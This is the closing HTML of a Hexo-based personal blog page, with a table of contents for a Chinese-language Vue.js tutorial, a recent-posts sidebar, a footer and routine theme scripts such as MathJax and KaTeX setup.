class="toc-text">el和data寫法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MVVM%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.6.</span> <span class="toc-text">MVVM模型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B8%E6%93%9A%E4%BB%A3%E7%90%86"><span class="toc-number">1.7.</span> <span class="toc-text">數據代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E8%99%95%E7%90%86"><span class="toc-number">1.8.</span> <span class="toc-text">事件處理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">1.8.1.</span> <span class="toc-text">事件的基本使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6%E4%BF%AE%E9%A3%BE%E7%AC%A6"><span class="toc-number">1.8.2.</span> <span class="toc-text">事件修飾符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%8D%B5%E7%9B%A4%E4%BA%8B%E4%BB%B6"><span class="toc-number">1.8.3.</span> <span class="toc-text">鍵盤事件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A8%88%E7%AE%97%E5%B1%AC%E6%80%A7"><span class="toc-number">1.9.</span> <span class="toc-text">計算屬性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B6%81%E5%AE%9A%E6%A8%A3%E5%BC%8F"><span class="toc-number">1.10.</span> <span class="toc-text">綁定樣式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#class%E6%A8%A3%E5%BC%8F"><span class="toc-number">1.10.1.</span> <span class="toc-text">class樣式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#style%E6%A8%A3%E5%BC%8F"><span class="toc-number">1.10.2.</span> <span class="toc-text">style樣式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A2%9D%E4%BB%B6%E6%B8%B2%E6%9F%93"><span class="toc-number">1.11.</span> <span class="toc-text">條件渲染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93-v-for"><span class="toc-number">1.12.</span> <span class="toc-text">列表渲染 v-for</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#key%E7%9A%84%E5%85%A7%E9%83%A8%E5%8E%9F%E7%90%86"><span class="toc-number">1.13.</span> <span class="toc-text">key的內部原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vue%E7%9B%A3%E6%B8%AC%E5%8E%9F%E7%90%86"><span class="toc-number">1.14.</span> <span class="toc-text">Vue監測原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E8%A1%A8%E5%96%AE%E6%95%B8%E6%93%9A"><span class="toc-number">1.15.</span> <span class="toc-text">收集表單數據</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%81%8E%E6%BF%BE%E5%99%A8%EF%BC%88%E5%B7%B2%E5%88%AA%E9%99%A4%EF%BC%89"><span class="toc-number">1.16.</span> <span class="toc-text">過濾器（已刪除）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vue%E5%85%A7%E7%BD%AE%E6%8C%87%E4%BB%A4"><span class="toc-number">1.17.</span> <span class="toc-text">Vue內置指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E7%BE%A9%E6%8C%87%E4%BB%A4"><span class="toc-number">1.17.1.</span> <span class="toc-text">自定義指令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E5%91%BD%E9%80%B1%E6%9C%9F"><span class="toc-number">1.18.</span> <span class="toc-text">生命週期</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B5%84%E4%BB%B6%E5%8C%96%E7%B7%A8%E7%A8%8B"><span class="toc-number">1.19.</span> <span class="toc-text">組件化編程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E5%96%AE%E6%96%87%E4%BB%B6%E7%B5%84%E4%BB%B6"><span class="toc-number">1.20.</span> <span class="toc-text">非單文件組件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%96%AE%E6%96%87%E4%BB%B6%E7%B5%84%E4%BB%B6"><span class="toc-number">1.21.</span> <span class="toc-text">單文件組件</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/myBlog/2024/01/25/CUHK/ESTR4316/2024-1-25-ESTR4316-Kubernates/" title="No title"><img src="https://p.ipic.vip/ruvwfy.jpg" onerror="this.onerror=null;this.src='/myBlog/img/404.jpg'" alt="No title"/></a><div class="content"><a class="title" href="/myBlog/2024/01/25/CUHK/ESTR4316/2024-1-25-ESTR4316-Kubernates/" title="No title">No title</a><time datetime="2024-01-25T11:24:54.480Z" title="Created 2024-01-25 19:24:54">2024-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/myBlog/2024/01/18/CUHK/ESTR4316/2024-1-18-ESTR4316-Introduction/" title="Introduction"><img src="https://p.ipic.vip/hwdr0p.jpg" onerror="this.onerror=null;this.src='/myBlog/img/404.jpg'" alt="Introduction"/></a><div class="content"><a class="title" href="/myBlog/2024/01/18/CUHK/ESTR4316/2024-1-18-ESTR4316-Introduction/" title="Introduction">Introduction</a><time datetime="2024-01-17T16:00:00.000Z" title="Created 2024-01-18 00:00:00">2024-01-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/myBlog/2024/01/18/LeetCode/2024-1-28-LeetCode/" title="LeetCode - Array"><img src="https://p.ipic.vip/vfdink.png" onerror="this.onerror=null;this.src='/myBlog/img/404.jpg'" alt="LeetCode - Array"/></a><div class="content"><a class="title" href="/myBlog/2024/01/18/LeetCode/2024-1-28-LeetCode/" title="LeetCode - Array">LeetCode - Array</a><time datetime="2024-01-17T16:00:00.000Z" title="Created 2024-01-18 00:00:00">2024-01-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/myBlog/2023/12/20/CUHK/CSCI4180/2023-12-15-CSCI4180-Tail-Tolerance/" title="Tail Tolerance"><img src="https://p.ipic.vip/ppekay.jpg" onerror="this.onerror=null;this.src='/myBlog/img/404.jpg'" alt="Tail Tolerance"/></a><div class="content"><a class="title" href="/myBlog/2023/12/20/CUHK/CSCI4180/2023-12-15-CSCI4180-Tail-Tolerance/" title="Tail Tolerance">Tail Tolerance</a><time datetime="2023-12-19T16:00:00.000Z" title="Created 2023-12-20 00:00:00">2023-12-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/myBlog/2023/12/15/CUHK/CSCI4180/2023-12-20-CSCI4180-Zookeeper/" title="Zookeeper"><img src="https://p.ipic.vip/ppekay.jpg" onerror="this.onerror=null;this.src='/myBlog/img/404.jpg'" alt="Zookeeper"/></a><div class="content"><a class="title" href="/myBlog/2023/12/15/CUHK/CSCI4180/2023-12-20-CSCI4180-Zookeeper/" title="Zookeeper">Zookeeper</a><time datetime="2023-12-14T16:00:00.000Z" title="Created 2023-12-15 00:00:00">2023-12-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By Donald Lam</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/myBlog/js/utils.js"></script><script src="/myBlog/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/myBlog/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex/dist/contrib/copy-tex.min.js"></script><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', { class: 'katex-wrap'})
+  })
+})()</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
